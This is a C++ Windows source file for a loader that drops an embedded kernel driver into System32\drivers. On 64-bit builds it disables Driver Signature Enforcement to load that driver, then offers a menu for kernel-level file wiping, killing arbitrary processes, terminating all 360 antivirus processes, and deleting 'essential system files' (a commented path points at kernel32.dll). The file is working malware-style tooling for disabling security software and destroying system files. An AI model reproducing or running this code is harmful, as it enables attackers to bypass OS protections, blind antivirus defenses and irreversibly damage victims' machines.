#include <iostream>
#include <Windows.h>
#include <winioctl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include "..\kernel_process_kill\ioctls.h"
#include "resource.h"

extern "C"
{
#include "main.h"
#include "ci-hunter\instdrv.h"
}

using namespace std;

#define DEL_FILE_PATH L"\\??\\C:\\Users\\weixingyu\\Desktop\\123.txt"
// #define DEL_FILE_PATH L"\\??\\C:\\Windows\\System32\\kernel32.dll"

BOOL ResourcesToFile(LPCTSTR lpType, LPCTSTR lpName, LPCTSTR lpFileName, LPCSTR lpSign)
{
	HRSRC hResInfo = FindResource(GetModuleHandle(NULL), lpName, lpType);
	DWORD dwSize = SizeofResource(GetModuleHandle(NULL), hResInfo);
	HGLOBAL hResData = LoadResource(GetModuleHandle(NULL), hResInfo);
	LPBYTE lpData = (LPBYTE)LockResource(hResData);
	HANDLE hFile = CreateFile(lpFileName, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		DWORD ErrorCode = GetLastError();
		FreeResource(hResData);
		return FALSE;
	}

	DWORD NumberOfBytesWritten = 0;
	WriteFile(hFile, lpData, dwSize, &NumberOfBytesWritten, NULL);

	CloseHandle(hFile);
	FreeResource(hResData);

	return TRUE;
}

int main() {
	// 释放驱动
	TCHAR FilePath[MAX_PATH] = { _T("0") };
	GetSystemDirectory(FilePath, MAX_PATH);
	_tcscat_s(FilePath, MAX_PATH, TEXT("\\drivers\\kernel_process_kill.sys"));

#ifdef _WIN64
	if (!ResourcesToFile(TEXT("PE"), MAKEINTRESOURCE(IDR_PE2), FilePath, NULL))
#else
	if (!ResourcesToFile(TEXT("PE"), MAKEINTRESOURCE(IDR_PE1), FilePath, NULL))
#endif
	{
		printf("ResourcesToFile fails!\r\n");
		system("pause");
		return 0;
	}

	printf("ResourcesToFile success!\r\n");
#ifdef _WIN64
	// 关闭DSE
	if (!DisableDSE(TRUE))
	{
		printf("DisabledDSE(TRUE) fails!\r\n");
		DeleteFile(FilePath);
		system("pause");
		return 0;
	}
	printf("DisabledDSE(TRUE) success!\r\n");
#endif
	HANDLE hDevice = INVALID_HANDLE_VALUE;
	// 加载驱动
	if (!scmLoadDeviceDriver(TEXT("ProcessTerminateDevice"), FilePath, &hDevice)) {
		printf("ScmLoadDeviceDriver fails!\r\n");
#ifdef _WIN64
		DisableDSE(FALSE);
#endif
		// DeleteFile(FilePath);
		system("pause");
		return 0;
	}

	printf("scmLoadDeviceDriver() success!\r\n");
#ifdef _WIN64
	// 开启DSE
	if (!DisableDSE(FALSE))
	{
		printf("DisabledDSE(FALSE) fails!\r\n");
		DeleteFile(FilePath);
		system("pause");
		return 0;
	}
#endif
	/*
	HANDLE hDevice = CreateFile(_T("\\\\.\\ProcessTerminateDevice"),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);*/
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("open device error with code: %d\n", GetLastError());
		system("pause");
		return 0;
	}
	else
		printf("succesfully open device\r\n");
	while (true) {
		printf("press 1 to delete specific file\r\n");
		printf("press 2 to terminte process\r\n");
		printf("press 3 to kill 360\r\n");
		printf("press 4 to delete some essential system files\r\n");
		int select;
		scanf_s("%d", &select);
		switch (select)
		{
		case 1:
		{
			// wipe specific file
			wchar_t file_path[MAX_PATH]{ 0 };
			// printf("input file path u want to delete\r\n");
			// scanf_s("%ws", file_path);
			wcscpy_s(file_path, DEL_FILE_PATH);
			UCHAR OutputBuffer[20];
			DWORD dwOutput;
			DeviceIoControl(hDevice, WIPE_FILE, file_path, (wcslen(file_path) + 1) * sizeof(wchar_t), OutputBuffer, 20, &dwOutput, NULL);
			if (dwOutput)
				printf("wipe result from kernel %ws\r\n", (wchar_t*)OutputBuffer);
			break;
		}
		case 2:
		{
			// terminte process
			printf("input pid u want to terminate\r\n");
			DWORD pid;
			scanf_s("%d", &pid);
			UCHAR OutputBuffer[20];
			DWORD dwOutput;
			DeviceIoControl(hDevice, TERMINATE_PROCESS, &pid, sizeof(DWORD), OutputBuffer, 20, &dwOutput, NULL);
			if (dwOutput)
				printf("terminate result from kernel %ws\r\n", (wchar_t*)OutputBuffer);
			break;
		}
		case 3:
		{
			// kill 360
			printf("start to kill all process related to 360~\r\n");
			HANDLE Snapshot;
			Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
			PROCESSENTRY32 processListStr;
			processListStr.dwSize = sizeof(PROCESSENTRY32);
			BOOL return_value;
			return_value = Process32First(Snapshot, &processListStr);

			while (return_value)
			{
				if (!wcscmp(L"ZhuDongFangYu.exe", processListStr.szExeFile) || wcsstr(processListStr.szExeFile, L"360")) {
					printf("find %ws with pid:%d\r\n", processListStr.szExeFile, processListStr.th32ProcessID);
					UCHAR OutputBuffer[20];
					DWORD dwOutput;
					DeviceIoControl(hDevice, TERMINATE_PROCESS, &processListStr.th32ProcessID, sizeof(DWORD), OutputBuffer, 20, &dwOutput, NULL);
					if (dwOutput)
						printf("terminate result from kernel %ws\r\n", (wchar_t*)OutputBuffer);
				}
				return_value = Process32Next(Snapshot, &processListStr);
			}
			CloseHandle(Snapshot);
			break;
		}
		case 4:
		{
			// delete system files
			printf("warning! it may damage you computer irreversibly!\r\n");
			printf("press y to continue:");
			getchar();
			if (getchar() == 'y') {
				wchar_t file_path[MAX_PATH]{ 0 };
				wcscpy_s(file_path, DEL_FILE_PATH);
				UCHAR OutputBuffer[20];
				DWORD dwOutput;
				DeviceIoControl(hDevice, DELETE_FILE, file_path, (wcslen(file_path) + 1) * sizeof(wchar_t), OutputBuffer, 20, &dwOutput, NULL);
				if (dwOutput)
					printf("delete result from kernel %ws\r\n", (wchar_t*)OutputBuffer);
			}
			break;
		}
		default:
			printf("fuck\r\n");
			break;
		}
	}
	system("pause");
}
